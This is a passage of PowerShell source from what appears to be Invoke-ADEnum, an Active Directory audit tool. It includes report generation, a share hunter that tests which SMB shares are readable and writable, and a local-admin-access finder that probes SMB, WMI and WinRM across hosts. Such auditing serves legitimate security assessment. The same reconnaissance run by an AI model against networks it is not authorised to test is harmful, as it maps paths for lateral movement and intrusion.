	########### All Descriptions ################
	####################################################

 	if($AllDescriptions -OR $AllEnum){
		Write-Host ""
		Write-Host "All Descriptions" -ForegroundColor Cyan
		$TempAllDescriptions = @()
		$TempAllDescriptions = foreach ($AllDomain in $AllDomains) {
			$Descriptions = @($SumGroupsUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.description})
			foreach($Description in $Descriptions){

				[PSCustomObject]@{
					"Domain Object" = if($Description.samaccountname){$Description.samaccountname}else{$Description.name}
					"Domain" = $AllDomain
					"Description" = $Description.description
				}
			}
		}
	
		if ($TempAllDescriptions) {
			if(!$NoOutput){$TempAllDescriptions | Sort-Object Domain,"Domain Object" | Format-Table -Autosize -Wrap}
			$HTMLAllDescriptions = $TempAllDescriptions | Sort-Object Domain,"Domain Object" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AllDescriptions'>All Descriptions</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AllDescriptions'>" }
		}
  	}
	
	############################################# 
	########### Output and Report ###############
	#############################################
    
	# Stop the stopwatch
	$stopwatch.Stop()

	# Get the elapsed time
	$elapsedTime = $stopwatch.Elapsed
	$elapsedTimeString = '{0:00}:{1:00}:{2:00}' -f $elapsedTime.Hours, $elapsedTime.Minutes, $elapsedTime.Seconds

	$TopLevelBanner = '<h1 id="downloadAll">Active Directory Audit</h1>'
	
	$EnvironmentDomain = $env:USERDNSDOMAIN
	if(!$EnvironmentDomain){$EnvironmentDomain = "Non-Joined"}
	
	$EnvironmentTable = [PSCustomObject]@{
		"Ran as User" = "$env:USERDOMAIN\$env:USERNAME"
		Domain = $EnvironmentDomain
		"Ran on Host" = $env:computername + '.' + $env:USERDNSDOMAIN
		"Date and Time" = Get-Date
		"Elapsed Time" = $elapsedTimeString
		"Enumeration Tool" = "Invoke-ADEnum"
		"Flags|Switches" = $invokedCommand
		"Recommendations" = "Show/Hide"
	}
	
	$HTMLEnvironmentTable = $EnvironmentTable | ConvertTo-Html -As List -Fragment -PreContent "<h2 data-linked-table='EnvironmentInfo' style='display: none;'>Environment Info</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EnvironmentInfo'>" }
	
	$HTMLEnvironmentTable = $HTMLEnvironmentTable.Replace("Invoke-ADEnum", '<a href="https://github.com/Leo4j/Invoke-ADEnum" target="_blank">Invoke-ADEnum</a>')
    
	$HTMLEnvironmentTable = $HTMLEnvironmentTable -replace 'Show/Hide', '<span onclick="toggleSections(event)" style="cursor:pointer; color:blue;">Click here to Show</span>'

	if(!$HTMLGPOCreators -AND !$HTMLGPOsWhocanmodify -AND !$HTMLGpoLinkResults -AND !$HTMLLAPSGPOs -AND !$HTMLLAPSAdminGPOs -AND !$HTMLLAPSCanRead -AND !$HTMLLAPSExtended -AND !$HTMLLapsEnabledComputers -AND !$HTMLAppLockerGPOs -AND !$HTMLGPOLocalGroupsMembership){$GroupPolicyChecksBanner = $null}
	if(!$HTMLUnconstrained -AND !$HTMLConstrainedDelegationComputers -AND !$HTMLConstrainedDelegationUsers -AND !$HTMLRBACDObjects -AND !$HTMLWeakPermissionsObjects -AND !$HTMLAccessAllowedComputers -AND !$HTMLADComputersCreated){$DelegationChecksBanner = $null}
	if(!$HTMLCertPublishers -AND !$HTMLVulnCertTemplates -AND !$HTMLExchangeTrustedSubsystem -AND !$HTMLServiceAccounts -AND !$HTMLGMSAs -AND !$HTMLnopreauthset -AND !$HTMLGPPasswords -AND !$HTMLPasswordSetUsers -AND !$HTMLUnixPasswordSet -AND !$HTMLEmptyPasswordUsers -AND !$HTMLEmptyPasswordComputers -AND !$HTMLTotalEmptyPass -AND !$HTMLCompTotalEmptyPass -AND !$HTMLPreWin2kCompatibleAccess -AND !$HTMLWin7AndServer2008 -AND !$HTMLMachineAccountsPriv -AND !$HTMLsidHistoryUsers -AND !$HTMLRevEncUsers -AND !$HTMLUnsupportedHosts){$MisconfigurationsBanner = $null}
	if(!$HTMLFileServers -AND !$HTMLSQLServers -AND !$HTMLSCCMServers -AND !$HTMLWSUSServers -AND !$HTMLSMBSigningDisabled -AND !$HTMLWebDAVStatusResults -AND !$HTMLVNCUnauthAccess -AND !$HTMLPrinters -AND !$HTMLSPNAccounts -AND !$HTMLSharesResultsTable -AND !$HTMLHomeDirectories -AND !$HTMLEmptyGroups){$ExtendedChecksBanner = $null}
	
	$Report = ConvertTo-HTML -Body "$TopLevelBanner $HTMLEnvironmentTable $HTMLTargetDomain $HTMLAllForests $HTMLKrbtgtAccount $HTMLdc $HTMLParentandChildDomains $HTMLDomainSIDsTable $HTMLForestDomain $HTMLForestGlobalCatalog $HTMLGetDomainTrust $HTMLTrustAccounts $HTMLTrustedDomainObjectGUIDs $HTMLGetDomainForeignGroupMember $AnalysisBanner $HTMLDomainPolicy $HTMLOtherPolicies $HTMLKerberosPolicy $HTMLUserAccountAnalysis $HTMLUserAccountAnalysisTable $HTMLComputerAccountAnalysis $HTMLComputerAccountAnalysisTable $HTMLOperatingSystemsAnalysis $HTMLLLMNR $HTMLMachineQuota $HTMLMachineAccountQuotaTable $HTMLLMCompatibilityLevel $HTMLLMCompatibilityLevelTable $HTMLVulnLMCompLevelComp $HTMLSubnets $AdministratorsBanner $HTMLBuiltInAdministrators $HTMLEnterpriseAdmins $HTMLDomainAdmins $HTMLReplicationUsers $HTMLDCsyncPrincipalsTable $HTMLAdminsProtectedUsersAndSensitive $HTMLAdminsProtectedUsersAndSensitiveTable $HTMLSecurityProtectedUsersAndSensitive $HTMLSecurityProtectedUsersAndSensitiveTable $HTMLAdmCountProtectedUsersAndSensitive $HTMLAdmCountProtectedUsersAndSensitiveTable $HTMLGroupsAdminCount $HTMLAdminCountGroupsTable $HTMLFindLocalAdminAccess $MisconfigurationsBanner $HTMLCertPublishers $HTMLADCSEndpointsTable $HTMLVulnCertTemplates $HTMLCertTemplatesTable $HTMLExchangeTrustedSubsystem $HTMLServiceAccounts $HTMLServiceAccountsTable $HTMLGMSAs $HTMLGMSAServiceAccountsTable $HTMLnopreauthset $HTMLNoPreauthenticationTable $HTMLGPPasswords $HTMLGPPasswordsTable $HTMLPasswordSetUsers $HTMLUserPasswordsSetTable $HTMLUnixPasswordSet $HTMLUnixPasswordSetTable $HTMLEmptyPasswordUsers $HTMLEmptyPasswordsTable $HTMLEmptyPasswordComputers $HTMLEmptyPasswordComputersTable $HTMLTotalEmptyPass $HTMLTotalEmptyPassTable $HTMLCompTotalEmptyPass $HTMLCompTotalEmptyPassTable $HTMLPreWin2kCompatibleAccess $HTMLPreWindows2000Table $HTMLWin7AndServer2008 $HTMLMachineAccountsPriv $HTMLMachineAccountsPrivilegedGroupsTable $HTMLsidHistoryUsers $HTMLSDIHistorysetTable $HTMLRevEncUsers $HTMLReversibleEncryptionTable $HTMLUnsupportedHosts $HTMLUnsupportedOSTable $ExtendedChecksBanner $HTMLFileServers $HTMLSQLServers $HTMLSCCMServers $HTMLWSUSServers $HTMLSMBSigningDisabled $HTMLWebDAVStatusResults $HTMLVNCUnauthAccess $HTMLPrinters $HTMLSPNAccounts $HTMLSharesResultsTable $HTMLHomeDirectories $HTMLEmptyGroups $GroupPolicyChecksBanner $HTMLGPOCreators $HTMLGPOsWhocanmodify $HTMLGpoLinkResults $HTMLLAPSGPOs $HTMLLAPSCanRead $HTMLLAPSExtended $HTMLLapsEnabledComputers $HTMLAppLockerGPOs $HTMLGPOLocalGroupsMembership $DelegationChecksBanner $HTMLUnconstrained $HTMLUnconstrainedTable $HTMLConstrainedDelegationComputers $HTMLConstrainedDelegationComputersTable $HTMLConstrainedDelegationUsers $HTMLConstrainedDelegationUsersTable $HTMLRBACDObjects $HTMLRBCDTable $HTMLWeakPermissionsObjects $HTMLWeakPermissionsTable $HTMLAccessAllowedComputers $HTMLAccessAllowedComputersTable $HTMLADComputersCreated $HTMLADComputersCreatedTable $SecurityGroupsBanner $HTMLAccountOperators $HTMLBackupOperators $HTMLCertPublishersGroup $HTMLDCOMUsers $HTMLDNSAdmins $HTMLEnterpriseKeyAdmins $HTMLEnterpriseRODCs $HTMLGPCreatorOwners $HTMLKeyAdmins $HTMLOrganizationManagement $HTMLPerformanceLogUsers $HTMLPrintOperators $HTMLProtectedUsers $HTMLRODCs $HTMLRDPUsers $HTMLRemManUsers $HTMLSchemaAdmins $HTMLServerOperators $InterestingDataBanner $HTMLInterestingServersEnabled $HTMLKeywordDomainGPOs $HTMLGroupsByKeyword $HTMLDomainOUsByKeyword $DomainObjectsInsightsBanner $HTMLServersEnabled $HTMLServersDisabled $HTMLWorkstationsEnabled $HTMLWorkstationsDisabled $HTMLEnabledUsers $HTMLDisabledUsers $HTMLOtherGroups $HTMLDomainGPOs $HTMLAllDomainOUs $HTMLAllDescriptions" -Title "Active Directory Audit" -Head $header
	
	if($Output){
		$Output = $Output.TrimEnd('\')
		if($Domain){
			$HTMLOutputFilePath = "$Output\$($DateFormat)_AD-Audit_$Domain.html"
		}
		else{
			$OutDomain=($env:userdnsdomain).ToLower()
			$HTMLOutputFilePath = "$Output\$($DateFormat)_AD-Audit_$OutDomain.html"
		}
	}
	else{
		if($Domain){
			$HTMLOutputFilePath = "$pwd\$($DateFormat)_AD-Audit_$Domain.html"
		}
		else{
			$OutDomain=($env:userdnsdomain).ToLower()
			$HTMLOutputFilePath = "$pwd\$($DateFormat)_AD-Audit_$OutDomain.html"
		}
	}
	
	$Report | Out-File $HTMLOutputFilePath
	
	if(!(Test-Path $HTMLOutputFilePath)){
		$HTMLOutputFilePath = Split-Path $HTMLOutputFilePath -Leaf
		$HTMLOutputFilePath = "c:\Users\Public\Documents\$HTMLOutputFilePath"
		$Report | Out-File $HTMLOutputFilePath
	}
	
	Write-Host ""
	Write-Host "Elapsed Time: $elapsedTimeString"
	Write-Host ""
	Write-Host "Output files: " -ForegroundColor Yellow
	Write-Host "$OutputFilePath"
	Write-Host "$HTMLOutputFilePath"
	Write-Host ""
	
	# Stop capturing the output and display it on the console
	Stop-Transcript | Out-Null
	
	$host.UI.RawUI.BufferSize = $originalBufferSize
    
	# Clean up error lines from output
	
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'TerminatingError' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Parameter name: binaryForm""' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSEdition:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSRemotingProtocolVersion:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSCompatibleVersions:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'BuildVersion:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'CLRVersion:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'WSManStackVersion:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PPSRemotingProtocolVersion:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'SerializationVersion:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'End time:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Windows PowerShell transcript end' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSVersion:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Process ID:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Host Application:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Configuration Name:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Start time:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Windows PowerShell transcript start' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Transcript started, output file is' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Parameter name: enumType""' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Parameter name: sddlForm""' } | Set-Content $OutputFilePath

	$oldBlockPattern = @"
Data Collection in Progress\.\.\.
\[\*\] Collecting Krbtgt\.\.\.
\[\*\] Collecting Domain Trusts\.\.\.
\[\*\] Collecting Domain Controllers\.\.\.
\[\*\] Collecting Policies\.\.\.
\[\*\] Collecting Users\.\.\.
\[\*\] Collecting Machines\.\.\.
\[\*\] Collecting Groups\.\.\.
\[\*\] Collecting GPOs\.\.\.
\[\*\] Collecting OUs\.\.\.
\[\*\] Collecting Certificate Templates\.\.\.
\[\*\] Collecting Subnets\.\.\.
\[\*\] Collecting GUID Mappings\.\.\.
\[\*\] Parsing Admin Groups members\.\.\.
\[\*\] Parsing Security Groups Members\.\.\.
\[\*\] Parsing RIDRole DCs\.\.
"@ -replace '\r?\n', '.*\r?\n?'

	$newBlock = @"
  _____                 _                      _____  ______
 |_   _|               | |               /\   |  __ \|  ____|
   | |  _ ____   _____ | | _____ ______ /  \  | |  | | |__   _ __  _   _ _ __ ___
   | | | '_ \ \ / / _ \| |/ / _ \______/ /\ \ | |  | |  __| | '_ \| | | | '_ ' _ \
  _| |_| | | \ V / (_) |   <  __/     / ____ \| |__| | |____| | | | |_| | | | | | |
 |_____|_| |_|\_/ \___/|_|\_\___|    /_/    \_\_____/|______|_| |_|\__,_|_| |_| |_|

                                       [+] Rob LP (@L3o4j) https://github.com/Leo4j
"@

	(Get-Content $OutputFilePath -Raw) -replace $oldBlockPattern, $newBlock | Set-Content $OutputFilePath
   
}

function Invoke-ShareHunter{

	<#
	.SYNOPSIS
	Invoke-ShareHunter Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-ShareHunter
 	#>
	
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Domain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[array]
		$Computers
		
	)
	
	$ErrorActionPreference = "SilentlyContinue"

	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	# Define the script block outside the loop for better efficiency
	$scriptBlock = {
		param ($computer)
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)
		$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
		if ($wait) {
			try {
				$tcpClient.EndConnect($asyncResult)
				return $computer
			} catch {}
		}
		$tcpClient.Close()
		return $null
	}

	# Use a generic list for better performance when adding items
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Computers) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	# Collect the results
	$reachable_hosts = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$reachable_hosts += $result
		}
	}

	# Update the $Computers variable with the list of reachable hosts
	$Computers = $reachable_hosts

	# Close and dispose of the runspace pool for good resource management
	$runspacePool.Close()
	$runspacePool.Dispose()
	
	$functiontable = @()
	
	# Create runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	$runspaces = @()

	foreach ($Computer in $Computers) {
		$scriptBlock = {
			param($Computer)

			# Getting all shares including hidden ones
			$allResults = net view \\$Computer /ALL | Out-String

			$startDelimiter = "-------------------------------------------------------------------------------"
			$endDelimiter = "The command completed successfully."

			$extractShares = {
			    param($results)
			    
			    $startIndex = $results.IndexOf($startDelimiter)
			    $endIndex = $results.IndexOf($endDelimiter)
			
			    $capturedContent = $results.Substring($startIndex + $startDelimiter.Length, $endIndex - $startIndex - $startDelimiter.Length).Trim()
			
			    return ($capturedContent -split "`n") | Where-Object { $_ -match '^(.+?)\s{2,}' } | ForEach-Object { $matches[1] }
			}

			$allShares = & $extractShares $allResults

			# Create hashtable for each share
			return $allShares | ForEach-Object {
				@{
					'Targets'  = $Computer
					'Share'    = $_
					'FullShareName'    = $null
					'Readable' = 'NO'
					'Writable' = 'NO'
					'Domain'   = $Domain  # Assuming $Domain is available in this context
				}
			}
		}

		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer)
		$runspace.RunspacePool = $runspacePool

		$runspaces += [PSCustomObject]@{
			Runspace = $runspace
			Status   = $runspace.BeginInvoke()
			Computer = $Computer
		}
	}

 	# Initialize an array to store all shares
	$AllShares = @()

	# Collect the results from each runspace
	$runspaces | ForEach-Object {
		$shares = $_.Runspace.EndInvoke($_.Status)
		if ($shares) { 
			$functiontable += $shares

   			foreach($shareObj in $shares) {
				$shareObj.Domain = $Domain
				$sharename = "\\" + $shareObj.Targets + "\" + $shareObj.Share
				$shareObj.FullShareName = $sharename
				$AllShares += $sharename
			}
		}
	}

	# Close and clean up the runspace pool
	$runspacePool.Close()
	$runspacePool.Dispose()

	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	$runspaces = @()

	foreach ($obj in $functiontable) {
		$scriptBlock = {
			param($obj)

			$Error.clear()
			ls $obj.FullShareName > $null
			if (!$error[0]) {
   				$obj.Readable = "YES"
				return $obj.FullShareName
			} else {
				return $null
			}
		}

		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($obj)
		$runspace.RunspacePool = $runspacePool

		$runspaces += [PSCustomObject]@{
			Runspace = $runspace
			Status   = $runspace.BeginInvoke()
			Share    = $obj
		}
	}

	# Initialize an array to store all readable shares
	$ReadableShares = @()

	# Collect the results from each runspace
	$runspaces | ForEach-Object {
		$shareResult = $_.Runspace.EndInvoke($_.Status)
		if ($shareResult) {
			$ReadableShares += $shareResult
		}
	}

	# Close and clean up the runspace pool
	$runspacePool.Close()
	$runspacePool.Dispose()

	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	$runspaces = @()

	foreach ($Share in $ReadableShares) {
		$scriptBlock = {
			
			param(
				[Parameter(Mandatory=$true)]
				[string]$Share
			)
			
			function Test-Write {
				[CmdletBinding()]
				param (
					[parameter()]
					[string] $Path
				)
				try {
					$testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
					$fileStream = [IO.File]::Create($testPath, 1, 'DeleteOnClose')
					$fileStream.Close()
					return "$Path"
				} finally {
					Remove-Item $testPath -ErrorAction SilentlyContinue
				}
			}
			
			try {
				$result = Test-Write -Path $Share
				return @{
					Share = $Share
					Result = $result
					Error = $null
				}
			} catch {
				return @{
					Share = $Share
					Result = $null
					Error = $_.Exception.Message
				}
			}
		}


		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Share)

		$runspace.RunspacePool = $runspacePool

		$runspaces += [PSCustomObject]@{
			Runspace = $runspace
			Status   = $runspace.BeginInvoke()
			Share    = $Share
		}
	}

	# Initialize an array to store all writable shares
	$WritableShares = @()

	# Collect the results from each runspace
	$runspaces | ForEach-Object {
		$runspaceData = $_.Runspace.EndInvoke($_.Status)
		if ($runspaceData.Result) {
			$WritableShares += $runspaceData.Result
		}
	}

	# Close and clean up the runspace pool
	$runspacePool.Close()
	$runspacePool.Dispose()
	
	foreach ($Share in $WritableShares) {
		foreach ($obj in $functiontable) {
			if($obj.FullShareName -eq $Share){
				$obj.Writable = "YES"
			}
		}
	}
	
	$FinalTable = @()
	
	$FinalTable = foreach ($obj in $functiontable) {
		if($obj.Readable -eq "YES"){
			[PSCustomObject]@{
				'Targets'  = $obj.Targets
				'Share Name'    = $obj.FullShareName
				'Readable' = $obj.Readable
				'Writable' = $obj.Writable
				'Domain'   = $obj.Domain
			}
		}
	}
	
	$FinalTable
}

function Test-SidFormat {
    param (
        [string]$SidString
    )

    # Regular expression to match the standard SID format
    $sidPattern = '^S-\d-\d+-(\d+-){1,14}\d+$'

    # Test if the input string matches the SID format
    return $SidString -match $sidPattern
}

function Test-LDAPConnectivity {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName
    )

    $GCPortLDAP = 3268
    $GCPortLDAPSSL = 3269
    $PortLDAP = 389
    $PortLDAPS = 636

    $resolvedName = [System.Net.Dns]::GetHostEntry($ComputerName).HostName

    $testPort = {
        param($ServerName, $Port)
        try {
            $LDAPPath = "LDAP://" + $ServerName + ':' + $Port
            $LDAPConnection = New-Object DirectoryServices.DirectoryEntry($LDAPPath)
            $LDAPConnection.close()
            return $true
        } catch {
            return $false
        }
    }

    $results = @{
        "389" = & $testPort $resolvedName $PortLDAP
        "636" = & $testPort $resolvedName $PortLDAPS
        "3268" = & $testPort $resolvedName $GCPortLDAP
        "3269" = & $testPort $resolvedName $GCPortLDAPSSL
    }

    $successfulPorts = @()
    if ($results["389"]) { $successfulPorts += "389" }
    if ($results["636"]) { $successfulPorts += "636" }
    if ($results["3268"]) { $successfulPorts += "3268" }
    if ($results["3269"]) { $successfulPorts += "3269" }

    $customObject = New-Object PSObject -Property @{
        ComputerName = $ComputerName
        ResolvedFQDN = $resolvedName
        PortLDAP = $results["389"]
        PortLDAPS = $results["636"]
        GCPortLDAP = $results["3268"]
        GCPortLDAPSSL = $results["3269"]
        SuccessfulPorts = ($successfulPorts -join ', ')
    }

    return $customObject
}

function Find-LocalAdminAccess {
	
	<#
	.SYNOPSIS
	Find-LocalAdminAccess Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Find-LocalAdminAccess
 	#>
	
	param (
		[string]$Targets,
		[string]$Command,
		[string]$Domain,
		[string]$DomainController,
		[switch]$ShowErrors
	)
	
	if(!$ShowErrors){
		$ErrorActionPreference = "SilentlyContinue"
		$WarningPreference = "SilentlyContinue"
	}

	$Computers = $Targets -split ","
	$Computers = $Computers | Sort-Object -Unique

    $Computers = $Computers | Where-Object { $_ -and $_.trim() }
	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	$TempHostname = $HostFQDN -replace '\..*', ''
	$Computers = $Computers | Where-Object {$_ -ne "$HostFQDN"}
	$Computers = $Computers | Where-Object {$_ -ne "$TempHostname"}
	
	# Create a runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()
	$runspaces = New-Object System.Collections.ArrayList

	$scriptBlock = {
		param ($computerName)

		Function Test-Port {
			param ($ComputerName, $Port)
			$tcpClient = New-Object System.Net.Sockets.TcpClient
			$asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
			$wait = $asyncResult.AsyncWaitHandle.WaitOne(100)

			if ($wait) {
				try {
					$tcpClient.EndConnect($asyncResult)
					return $true
				}
				catch {
					return $false
				}
			}
			else {
				return $false
			}
		}

		# Check Ports
		$WinRMPort = Test-Port -ComputerName $ComputerName -Port 5985
		$WMIPort = Test-Port -ComputerName $ComputerName -Port 135
		$SMBPort = Test-Port -ComputerName $ComputerName -Port 445


		# if all three fail, return and kill the runspace
		if (-not $SMBPort -and -not $WMIPort -and -not $WinRMPort) {
			return "Unable to connect"
		}

		# SMB Check
		if ($SMBPort) {
			$SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction SilentlyContinue
			if (-not $SMBCheck) {
				$SMBAccess = $False
			}
			else {
				$SMBAccess = $True
			}
		}

		# WMI Check
		if ($WMIPort) {
			$Timeout = 2000
			$Result = $null
			$Command = "Get-WmiObject -Class Win32_OperatingSystem -ComputerName '$ComputerName'"
			$Process = New-Object System.Diagnostics.Process
			$Process.StartInfo.FileName = "powershell.exe"
			$Process.StartInfo.Arguments = "-NoProfile -Command $Command"
			$Process.StartInfo.RedirectStandardOutput = $true
			$Process.StartInfo.RedirectStandardError = $true
			$Process.StartInfo.UseShellExecute = $false
			$Process.StartInfo.CreateNoWindow = $true
			$Process.Start() | Out-Null
			if ($Process.WaitForExit($Timeout)) {$Result = $Process.StandardOutput.ReadToEnd()}
			else {$Process.Kill()}
			$Process.Dispose()
			if ($Result) {$WMIAccess = $True}
			else {$WMIAccess = $False}
		}

		# WinRM Check
		if ($WinRMPort) {
			try {
				Invoke-Command -ComputerName $computerName -ScriptBlock { whoami } -ErrorAction Stop
				$WinRMAccess = $True
			}
			catch {
				if ($_.Exception.Message -like "*Access is Denied*") {
					$WinRMAccess = $False
				}
				elseif ($_.Exception.Message -like "*cannot be resolved*") {
					$WinRMAccess = $False
				}
			}
		}

		return @{
			WMIAccess   = $WMIAccess
			SMBAccess   = $SMBAccess
			WinRMAccess = $WinRMAccess
		}
	}

	# Create and invoke runspaces for each computer
	foreach ($computer in $computers) {

		$ComputerName = "$Computer"
		
		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName)
		$runspace.RunspacePool = $runspacePool

		[void]$runspaces.Add([PSCustomObject]@{
				Runspace     = $runspace
				Handle       = $runspace.BeginInvoke()
				ComputerName = $ComputerName
				Completed    = $false
			})
	}
	
	$results = @()

	# Poll the runspaces and display results as they complete
	do {
		foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
			if ($runspace.Handle.IsCompleted) {
				$runspace.Completed = $true
				$result = $runspace.Runspace.EndInvoke($runspace.Handle)
			
				if ($result -eq "Unable to connect") { continue }

				# Build string of successful protocols
				$successfulProtocols = @()
				if ($result.SMBAccess -eq $True) { $successfulProtocols += "SMB" }
				if ($result.WinRMAccess -eq $True) { $successfulProtocols += "WinRM" }
				if ($result.WMIAccess -eq $True) { $successfulProtocols += "WMI" }

				if ($successfulProtocols.Count -gt 0) {
					$statusText = $successfulProtocols -join ', '
					$obj = New-Object PSObject -Property @{
                        ComputerName = $runspace.ComputerName
                        Protocol = $statusText
                    }
					$results += $obj
					#return $($runspace.ComputerName)
					continue
				}
			}
		}
		Start-Sleep -Milliseconds 100
	} while ($runspaces | Where-Object { -not $_.Completed })
	
	$results | ForEach-Object { Write-Output $_ }

	# Clean up
	$runspacePool.Close()
	$runspacePool.Dispose()
}

function GetSID-FromBytes {
	param (
        [byte[]]$sidBytes
    )
	
	$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
	$stringSid = $sid.Value
	return $stringSid
}

function Convert-ADTimeToDays {
    param (
        [Int64]$Interval
    )

    # Check for the special case where the interval is the minimum value for Int64
    if ($Interval -eq 0) {
        return "0"
    } elseif ($Interval -eq [Int64]::MinValue) {
        return "Never Expires"
    } else {
        # Convert intervals to days. AD stores intervals as negative 100-nanosecond units.
        return [Math]::Abs($Interval) / 864000000000
    }
}

function Convert-LdapTimestamp {
    param([string]$timestamp)
    if ($timestamp -eq "0" -OR $timestamp -eq "9223372036854775807") {
        return "NEVER"
    }
    else {
        [datetime]$epoch = "1/1/1601"
        $date = $epoch.AddTicks($timestamp)
        return $date
    }
}

function FindDomainTrusts {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$Server
    )

    # Define the TrustAttributes mapping
    $TrustAttributesMapping = @{
        [uint32]'0x00000001' = 'NON_TRANSITIVE'
        [uint32]'0x00000002' = 'UPLEVEL_ONLY'
        [uint32]'0x00000004' = 'FILTER_SIDS' # This indicates SID filtering
        [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
        [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
        [uint32]'0x00000020' = 'WITHIN_FOREST'
        [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
        [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
        [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
        [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
        [uint32]'0x00000400' = 'PIM_TRUST'
    }

    try {
        # Construct the LDAP path and create the DirectorySearcher
        $ldapPath = if ($Server) { "LDAP://$Server/DC=$($Domain -replace '\.',',DC=')" } else { "LDAP://DC=$($Domain -replace '\.',',DC=')" }
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
        $searcher.Filter = "(objectClass=trustedDomain)"
        $searcher.PropertiesToLoad.AddRange(@("name", "trustPartner", "trustDirection", "trustType", "trustAttributes", "whenCreated", "whenChanged"))
        
        # Execute the search
        $results = $searcher.FindAll()

        # Enumerate the results
        foreach ($result in $results) {
            # Resolve the trust direction
            $Direction = Switch ($result.Properties["trustdirection"][0]) {
                0 { 'Disabled' }
                1 { 'Inbound' }
                2 { 'Outbound' }
                3 { 'Bidirectional' }
            }

            # Resolve the trust type
            $TrustType = Switch ($result.Properties["trusttype"][0]) {
                1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                3 { 'MIT' }
            }

            # Resolve the trust attributes
            $TrustAttributes = @()
            $SIDFilteringEnabled = $false
            $TreatAsExternal = $false
            $ForestTransitive = $false

            foreach ($key in $TrustAttributesMapping.Keys) {
                if ($result.Properties["trustattributes"][0] -band $key) {
                    $TrustAttributes += $TrustAttributesMapping[$key]
                    
                    # Track specific attribute flags for SID history determination
                    if ($key -eq [uint32]'0x00000004') { $SIDFilteringEnabled = $true }
                    if ($key -eq [uint32]'0x00000040') { $TreatAsExternal = $true }
                    if ($key -eq [uint32]'0x00000008') { $ForestTransitive = $true }
                }
            }

